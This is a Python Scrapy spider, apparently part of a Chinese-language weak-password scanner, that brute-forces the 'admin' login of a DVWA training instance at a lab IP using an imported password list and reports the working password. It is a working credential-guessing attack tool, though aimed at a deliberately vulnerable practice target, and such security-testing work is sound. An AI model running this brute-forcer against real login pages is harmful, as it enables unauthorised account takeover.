#--Created by WD
#python 3.6
#coding:utf-8

from scrapy import *
from pymysql import *
import re
from scrapy.conf import settings
import random
import requests
from ..Vulnerability_policy_Library.WeakPd.pass_list import pass_list

class Weakpwd_Spider(Spider):
    '''弱口令漏洞检测'''

    name = 'WeakpwdSpider'

    def __init__(self):
        self.url = 'http://192.168.177.161/dvwa/login.php'
        self.passth = 0
        self.username = None
        self.password = None
        self.pass_list = pass_list
        print(self.pass_list)

    def start_requests(self):
        '''重写starturl的请求'''
        # 开始url
        self.start_urls = []
        self.start_urls.append(self.url)
        yield Request(self.start_urls[0], callback=self.parse)


    def parse(self, response):

        '''从字典列表中获取一个密码'''
        self.username = 'admin'
        self.password = self.pass_list[self.passth]
        #根据表单属性等获取fromdata
        formlist = self.form_find(str(response.body))
        formdata = {
            formlist[2]:self.username,
            formlist[4]:self.password,
            formlist[6]:formlist[7],
        }
        print(formdata)
        return FormRequest.from_response(
            response,
            method = 'POST',
            formdata= formdata,
            callback=self.after_login,
            dont_filter=True,#由于暴力破解针对同一个url，这里一定要设置，否则重复链接不会进行下一步爬取
        )


    def after_login(self, response):
        '''check login succeed before going on'''
        if response.url == self.start_urls[0]:
            print(r'登录失败！')
            self.passth = self.passth + 1
            yield Request(self.start_urls[0], callback=self.parse, dont_filter = True)
        else:
            print('登录成功')
            print('用户名:', self.username, ',密码:', self.password)
        return


    def form_find(self, html):
        '''在登录页面的响应中找到form表单，并根据表单属性等获取fromdata'''
        action = None
        method = None
        username_parameter = None
        username_value = None
        password_parameter = None
        password_value = None
        loginbutton_parameter = None
        loginbutton_value = None
        #匹配form表单列表
        for form in re.finditer(r'<form.*>([\s\S])*</form>', html):
            if 'username' in form.group() or 'password' in form.group() or 'pass' in form.group() or 'pwd' in form.group() or 'accout' in form.group():
                tgtform = form.group()

        print(tgtform)
        #匹配form里面的所有参数和值
        parameter_list = []
        for p in re.finditer(r'(?P<parameter>[\w]+)="(?P<value>[^ ]+)"( |>)', tgtform):
            parameter_list.append({'parameter':p.group('parameter'),'value':p.group('value')})
            #匹配action
            if p.group('parameter') == 'action':
                action = p.group('value')
            #匹配http方法
            if p.group('parameter') == 'method':
                method = p.group('value')

        #匹配input里面的所有参数和值
        for q in re.finditer(r'<input( )+(((?P<parameter>[\w]*)="(?P<value>[^ ]+)"( )?))+>', form.group()):
            print(q)
            if 'name="username"' in q.group():
                username_parameter = 'username'
                username_value = q.group('value')
            if 'name="password"' in q.group():
                password_parameter = 'password'
                password_value = q.group('value')
            if 'button' in q.group() or 'submit' in q.group() or 'login' in q.group().lower():
                loginbutton_parameter = q.group('value')
                if 'value' in q.group().lower():
                    for r in re.finditer(r'value="(?P<loginvalue>[^ ]+)"( )?', q.group()):
                        loginbutton_value = 'login'

        return action, method, username_parameter,username_value, password_parameter,password_value, loginbutton_parameter,loginbutton_value

